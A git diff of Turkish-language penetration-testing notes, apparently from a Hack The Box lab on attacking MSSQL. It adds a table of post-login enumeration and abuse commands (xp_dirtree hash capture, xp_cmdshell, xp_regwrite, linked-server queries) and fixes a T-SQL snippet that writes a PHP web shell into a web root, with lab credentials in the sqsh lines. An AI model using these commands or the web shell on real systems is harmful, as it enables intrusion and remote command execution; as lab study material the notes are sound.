@@ -58,6 +58,28 @@ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 - **SQL Authentication:** Domain veya hostname verilmezse, SQL Server içinde tanımlı kullanıcılar kullanılır.
 - **Yerel hesap:** `SERVERNAME\accountname` veya `.\accountname` şeklinde yazılır.
 
+# sqsh ile htbdbuser Oturumunda Yapılabilecekler
+
+| Komut | Ne yapar | Bu oturumda durum |
+|-------|----------|-------------------|
+| `SELECT SYSTEM_USER` | Bağlı login adını gösterir | `htbdbuser` |
+| `SELECT IS_SRVROLEMEMBER('sysadmin')` | Sysadmin mi kontrol eder (1/0) | `0`, sysadmin değil |
+| `SELECT name FROM sys.databases` | Veritabanlarını listeler | `flagDB` görünür |
+| `USE flagDB` | flagDB'ye geçer | Erişim yok (kullanıcı eşlemesi yok) |
+| `SELECT srvname, isremote FROM sysservers` | Linked server / uzak sunucuları listeler | Sadece `WINSRV02\SQLEXPRESS` (isremote=1) |
+| `SELECT ... FROM sys.server_permissions ... 'IMPERSONATE'` | Impersonation yetkisini kontrol eder | Boş, izin yok |
+| `SELECT ... FROM sys.server_role_members ...` | Sunucu rollerini gösterir | Boş, rol yok |
+| `EXEC master..xp_dirtree '\\IP\share'` | SMB üzerinden bağlantı tetikler (hash denemesi) | Hash gelmedi |
+| `EXEC master..xp_cmdshell 'whoami'` | İşletim sistemi komutu çalıştırır | Yetki yok (denenmedi, ama sysadmin değilsin) |
+| `EXEC master..xp_regread ...` | Registry okur | Yetki yok |
+| `EXEC master..xp_regwrite ...` | Registry yazar (yetki yükseltme) | Yetki yok |
+| `SELECT name, credential_identity FROM sys.credentials` | Kayıtlı credential'ları listeler | Boş |
+| `SELECT ... FROM msdb.dbo.sysjobs ...` | SQL Agent job'larını ve komutlarını listeler | Sorgu hata verdi, tekrar denenmedi |
+| `EXECUTE('...') AT [linked_server]` | Linked server üzerinde sorgu çalıştırır | Linked server yok |
+
+
+
+
 ```bash
 sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 ```
@@ -224,7 +246,7 @@ DECLARE @OLE INT
 DECLARE @FileID INT
 EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
 EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
-EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>
 EXECUTE sp_OADestroy @FileID
 EXECUTE sp_OADestroy @OLE
 GO
